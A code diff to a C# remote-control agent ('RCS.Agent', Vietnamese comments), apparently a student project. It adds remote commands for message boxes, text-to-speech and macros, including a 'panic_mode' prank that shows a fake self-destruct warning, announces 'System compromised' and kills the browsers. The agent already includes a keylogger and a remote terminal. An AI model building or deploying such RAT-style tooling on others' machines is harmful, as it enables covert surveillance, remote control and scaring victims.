@@ -17,6 +17,7 @@ using System;
 using System.Net.Sockets;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Speech.Synthesis;
 
 namespace RCS.Agent
 {
@@ -58,6 +59,7 @@ namespace RCS.Agent
         private static Keylogger _keylogger;
         private static SystemInfoManager _sysInfoManager; 
         private static TerminalService _terminalService;
+        private static AutomationService _automationService;
 
         // Biến phục vụ Streaming
         private static CancellationTokenSource _webcamCts; 
@@ -158,6 +160,7 @@ namespace RCS.Agent
             _keylogger = new Keylogger();
             _udpClient = new UdpClient();
             _sysInfoManager = new SystemInfoManager();
+            _automationService = new AutomationService();
             // ...
 
             // Khởi tạo SignalR và đăng ký sự kiện nhận lệnh
@@ -275,6 +278,25 @@ namespace RCS.Agent
                         // Lấy lệnh từ tham số 'cmd' gửi xuống
                         string inputCmd = GetParam(cmd, "cmd");
                         _terminalService.WriteInput(inputCmd);
+                        break;
+
+                    // --- NHÓM TƯƠNG TÁC ---
+                    case ProtocolConstants.ActionShowMessageBox:
+                        string msg = GetParam(cmd, "text");
+                        _automationService.ShowMessageBox(msg);
+                        await SendResponse(cmd.Action, "displayed");
+                        break;
+
+                    case ProtocolConstants.ActionTextToSpeech:
+                        string textToSpeak = GetParam(cmd, "text");
+                        _automationService.SpeakText(textToSpeak);
+                        await SendResponse(cmd.Action, "speaking");
+                        break;
+
+                    // --- NHÓM MACRO (KỊCH BẢN TỰ ĐỘNG) ---
+                    case ProtocolConstants.ActionRunMacro:
+                        string macroType = GetParam(cmd, "type");
+                        await RunMacro(macroType);
                         break;
                 }
             }
@@ -438,6 +460,40 @@ namespace RCS.Agent
         private static string CleanString(string input)
         {
             return input.Replace("}", "").Replace("\"", "").Replace(",", "").Trim();
+        }
+
+        // HÀM XỬ LÝ MACRO RIÊNG
+        private static async Task RunMacro(string type)
+        {
+            Console.WriteLine($"[Macro] Executing script: {type}");
+            
+            if (type == "panic_mode") // Kịch bản: Dọn dẹp khẩn cấp
+            {
+                // 1. Hiện thông báo trêu tức
+                _automationService.ShowMessageBox("Hệ thống phát hiện xâm nhập! Tự hủy sau 3 giây...");
+                
+                // 2. Nói cảnh báo
+                _automationService.SpeakText("System compromised. Shutting down immediately.");
+
+                // 3. Tắt các trình duyệt (Chrome, Edge)
+                _appManager.StopApp("chrome");
+                _appManager.StopApp("msedge");
+
+                // 4. Chờ 3 giây
+                await Task.Delay(3000);
+
+                // 5. Tắt máy (Hoặc Logoff)
+                // _systemControl.Shutdown(); // Uncomment dòng này để tắt thật
+                Console.WriteLine("[Macro] Fake shutdown executed."); 
+            }
+            else if (type == "open_workspace") // Kịch bản: Mở môi trường làm việc
+            {
+                _appManager.StartApp("notepad");
+                _appManager.StartApp("calc");
+                _automationService.SpeakText("Workspace is ready boss.");
+            }
+
+            await SendResponse(ProtocolConstants.ActionRunMacro, "executed");
         }
 
         #endregion
